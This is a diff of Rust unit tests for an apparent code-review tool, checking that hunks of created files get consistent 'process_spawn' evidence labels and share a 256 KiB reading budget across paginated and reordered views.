+    /// budget crosses from Rust into JavaScript and from JavaScript into Rust. With the shares
+    /// worked out here from the sizes: a file has the hunks that fit in what is left, and takes
+    /// them, when they are two or more, whatever its language.
+    fn shared_patch() -> (String, Vec<usize>) {
+        let plan: [(&str, usize, usize); 8] = [
+            ("src/a.rs", 32, 3072),
+            ("src/b.js", 32, 3072),
+            ("src/d.js", 32, 2560),
+            ("src/e.rs", 4, 2048),
+            ("src/f.js", 4, 2048),
+            ("src/m.rs", 0, 0),
+            ("src/g.rs", 3, 100),
+            ("src/h.js", 4, 100),
+        ];
+        let mut text = String::new();
+        let mut left = CARRIED_BOUND;
+        let mut shares = Vec::new();
+        for (path, hunks, size) in plan {
+            if hunks == 0 {
+                text.push_str("--- a/src/m.rs\n+++ b/src/m.rs\n@@ -1,1 +1,2 @@\n x\n+y\n");
+                shares.push(0);
+                continue;
+            }
+            text.push_str(&sized_creation(path, &[size].repeat(hunks)));
+            let fit = (left / size).min(hunks);
+            shares.push(if fit < 2 { 0 } else { fit });
+            left -= if fit < 2 { 0 } else { fit * size };
+        }
+        assert_eq!(shares, [32, 32, 25, 0, 0, 0, 3, 4]);
+        (text, shares)
+    }
+
+    /// Checks the labels of the hunks views list against the shares, and notes each hunk seen.
+    struct Shared<'a> {
+        files: &'a [ReviewFile],
+        shares: Vec<usize>,
+        seen: std::collections::HashSet<(usize, usize)>,
+    }
+
+    impl Shared<'_> {
+        /// In the reading of release 0.8.4, a hunk read together, but the first of its file,
+        /// has the spawn.
+        fn released_label(&self, f: usize, h: usize) -> Value {
+            if (1..self.shares[f]).contains(&h) {
+                json!(["process_spawn"])
+            } else {
+                Value::Null
+            }
+        }
+
+        /// Since the merge with the integrity signals, every hunk but the first of a file the
+        /// patch creates has the spawn, whatever its share: their reading of a creation as one
+        /// text has no bound, and a fragment is also read from inside a block comment. (Was
+        /// [`Self::released_label`] in every view.)
+        fn label(&self, f: usize, h: usize) -> Value {
+            if self.files[f].status == deep_diff_forge_core::FileStatus::Added && h > 0 {
+                json!(["process_spawn"])
+            } else {
+                Value::Null
+            }
+        }
+
+        fn check(&mut self, what: &str, units: &[Value]) {
+            for unit in units {
+                let address = unit["address"].as_str().unwrap();
+                let (f, h) = self
+                    .files
+                    .iter()
+                    .enumerate()
+                    .find_map(|(f, file)| {
+                        let hunks = &file.patch_twin.hunks;
+                        let h = hunks
+                            .iter()
+                            .position(|x| x.address(&file.path) == address)?;
+                        Some((f, h))
+                    })
+                    .unwrap();
+                assert_eq!(
+                    unit["evidence"],
+                    self.label(f, h),
+                    "{what}: file {f} hunk {h}"
+                );
+                self.seen.insert((f, h));
+            }
+        }
+
+        /// The outline's units, or the hunks', of `answer`.
+        fn units(answer: &Value) -> Vec<Value> {
+            match answer["files"].as_array() {
+                Some(files) => files
+                    .iter()
+                    .flat_map(|entry| entry["hunks"].as_array().unwrap().iter().cloned())
+                    .collect(),
+                None => answer["hunks"].as_array().unwrap().clone(),
+            }
+        }
+
+        /// Every page of a view, each a request held at the bound, checked.
+        fn pages(&mut self, what: &str, mut view: impl FnMut(Option<String>) -> Value) -> usize {
+            let (mut cursor, mut pages) = (None, 0);
+            loop {
+                let (answer, _) = carried_by(|| view(cursor.take()));
+                self.check(what, &Self::units(&answer));
+                pages += 1;
+                cursor = answer["next_cursor"].as_str().map(str::to_owned);
+                if cursor.is_none() {
+                    return pages;
+                }
+            }
+        }
+    }
+
+    /// The created files of a patch share one carried reading of 256 KiB ([`shared_patch`]).
+    /// Every view gives every hunk the same labels: the rank, the outline whole and page by
+    /// page, every hunk whole and page by page, the hunks by path in reverse, by address in
+    /// reverse, shuffled, each alone, and the last hunk of each file. And each of those
+    /// requests reads at most 256 KiB in the carried reading in all, counted on the thread
+    /// whatever readers it makes; the outline and the listing of every hunk read it once, as
+    /// the rank does.
+    #[test]
+    fn the_created_files_of_a_patch_share_one_bound_in_every_view() {
+        let (text, wanted) = shared_patch();
+        let r = review(&text);
+        let files = r.files();
+        let of_patch = deep_diff_forge_graph::CarriedShares::of(files);
+        let got: Vec<usize> = (0..files.len())
+            .map(|f| of_patch.read_together(f))
+            .collect();
+        assert_eq!(got, wanted);
+        let mut shared = Shared {
+            files,
+            shares: wanted,
+            seen: std::collections::HashSet::new(),
+        };
+        // The reading of release 0.8.4, each file with its share.
+        for (f, file) in files.iter().enumerate() {
+            let mut released = deep_diff_forge_graph::HunkLabels::in_patch(file, &of_patch, f, &[]);
+            for h in 0..file.patch_twin.hunks.len() {
+                let labels: Vec<&str> = released.of(h).iter().map(|s| s.label()).collect();
+                let labels = if labels.is_empty() {
+                    Value::Null
+                } else {
+                    json!(labels)
+                };
+                assert_eq!(
+                    labels,
+                    shared.released_label(f, h),
+                    "the reading of 0.8.4: {f} {h}"
+                );
+            }
+        }
+        // The rank.
+        let (ranked, once) = carried_by(|| deep_diff_forge_graph::rank(files));
+        assert!(once > CARRIED_BOUND / 2, "{once}");
+        for listed in &ranked {
+            let f = files
+                .iter()
+                .position(|file| file.path == listed.path)
+                .unwrap();
+            for (h, hunk) in files[f].patch_twin.hunks.iter().enumerate() {
+                let has = listed.evidence.iter().any(|e| e.hunk == hunk.id);
+                assert_eq!(has, shared.label(f, h) != Value::Null, "rank: {f} {h}");
+            }
+        }
+        // The outline and every hunk, whole (one reading, as the rank) and page by page.
+        let whole = page(MAX_MAX_BYTES, None);
+        let (answer, read) = carried_by(|| outline(&r, &whole).unwrap());
+        assert_eq!(read, once, "the outline reads it once");
+        shared.check("outline", &Shared::units(&answer));
+        let pages = shared.pages("outline page", |c| outline(&r, &page(8192, c)).unwrap());
+        assert!(pages > 2, "{pages} pages");
+        let (all, read) = carried_by(|| hunks(&r, &Selection::All, &whole).unwrap());
+        assert_eq!(read, once, "every hunk reads it once");
+        shared.check("every hunk", &Shared::units(&all));
+        let big = 256 * 1024;
+        let pages = shared.pages("every hunk, a page", |c| {
+            hunks(&r, &Selection::All, &page(big, c)).unwrap()
+        });
+        assert!(pages > 1, "{pages} pages");
+        // By path, every path in reverse; by address in reverse, shuffled, each alone, and the
+        // last hunk of each file.
+        let paths: Vec<String> = files.iter().rev().map(|file| file.path.clone()).collect();
+        let addresses: Vec<String> = Shared::units(&all)
+            .iter()
+            .map(|unit| unit["address"].as_str().unwrap().to_owned())
+            .collect();
+        let mut shuffled = addresses.clone();
+        let mut seed = 0x2545_F491_4F6C_DD1D_u64;
+        for i in (1..shuffled.len()).rev() {
+            seed ^= seed << 13;
+            seed ^= seed >> 7;
+            seed ^= seed << 17;
+            shuffled.swap(i, usize::try_from(seed % (i as u64 + 1)).unwrap());
+        }
+        let mut selections = vec![
+            ("by path in reverse", Selection::Paths(paths)),
+            (
+                "in reverse",
+                Selection::Addresses(addresses.iter().rev().cloned().collect()),
+            ),
+            ("shuffled", Selection::Addresses(shuffled)),
+        ];
+        let last_of_each = files
+            .iter()
+            .map(|file| file.patch_twin.hunks.last().unwrap().address(&file.path));
+        selections.push((
+            "the last of each file",
+            Selection::Addresses(last_of_each.collect()),
+        ));
+        for address in &addresses {
+            selections.push(("alone", Selection::Addresses(vec![address.clone()])));
+        }
+        for (what, selection) in &selections {
+            let (answer, _) = carried_by(|| hunks(&r, selection, &whole).unwrap());
+            shared.check(what, &Shared::units(&answer));
+        }
+        let total: usize = files.iter().map(|file| file.patch_twin.hunks.len()).sum();
+        assert_eq!(shared.seen.len(), total);
+    }
+
     /// Hunks by address come back in the order asked, verbatim; by path, every hunk of the file.
     /// Bug hunt 2026-10-28, H2-04: a view carries at most `SECTION_VIEW_BYTES` of a heading, cut at
     /// a character boundary and flagged, so one huge heading cannot blow every page's budget.
@@ -906,7 +1729,7 @@ mod tests {
         let r = review(&format!(
             "--- a/x.rs\n+++ b/x.rs\n@@ -1,25 +1,25 @@ {long}\n{pairs}"
         ));
-        let head = hunk_head(&r.files()[0], &r.files()[0].patch_twin.hunks[0]);
+        let head = hunk_head(&r.files()[0], &r.files()[0].patch_twin.hunks[0], &[]);
         assert_eq!(head["section"], "S".repeat(SECTION_VIEW_BYTES - 1));
         assert_eq!(head["section_truncated"], true);
         for view in [
@@ -919,7 +1742,7 @@ mod tests {
         let r = review(&format!(
             "--- a/x.rs\n+++ b/x.rs\n@@ -1 +1 @@ {exact}\n-a\n+b\n"
         ));
-        let head = hunk_head(&r.files()[0], &r.files()[0].patch_twin.hunks[0]);
+        let head = hunk_head(&r.files()[0], &r.files()[0].patch_twin.hunks[0], &[]);
         assert_eq!(head["section"], exact);
         assert!(!head.contains_key("section_truncated"));
     }
@@ -964,7 +1787,7 @@ mod tests {
                 Selection::Addresses(vec![address.clone(); 50]),
             ),
         ] {
-            let (units, _) = select(r.files(), &repeated).unwrap();
+            let (units, _) = select(&Scans::of(r.files()), &repeated).unwrap();
             assert!(units.len() <= total, "{repeated:?}: {}", units.len());
             assert_eq!(
                 hunks(&r, &repeated, &Page::default()).unwrap(),
@@ -979,7 +1802,7 @@ mod tests {
             "src/f0.rs".into(),
             "src/f2.rs".into(),
         ]);
-        let (units, key) = select(r.files(), &picked).unwrap();
+        let (units, key) = select(&Scans::of(r.files()), &picked).unwrap();
         let files: Vec<usize> = units.iter().map(|&(f, _)| f).collect();
         assert_eq!(files, [2, 2, 2, 0, 0, 0]);
         assert_eq!(key, "p:src/f2.rs\nsrc/f0.rs");
@@ -987,7 +1810,7 @@ mod tests {
         let f1 = r.files()[1].patch_twin.hunks[1].address("src/f1.rs");
         let f3 = r.files()[3].patch_twin.hunks[0].address("src/f3.rs");
         let picked = Selection::Addresses(vec![f3.clone(), f1.clone(), f3.clone()]);
-        let (units, key) = select(r.files(), &picked).unwrap();
+        let (units, key) = select(&Scans::of(r.files()), &picked).unwrap();
         assert_eq!(units, [(3, 0), (1, 1)]);
         assert_eq!(key, format!("a:{f3}\n{f1}"));
     }
@@ -1015,7 +1838,12 @@ mod tests {
             calls.set(calls.get() + 1);
             hunk.address(path)
         };
-        let (units, _) = select_with(r.files(), &Selection::Addresses(wanted), &counting).unwrap();
+        let (units, _) = select_with(
+            &Scans::of(r.files()),
+            &Selection::Addresses(wanted),
+            &counting,
+        )
+        .unwrap();
         assert_eq!(units.len(), total);
         assert_eq!(calls.get(), total);
     }
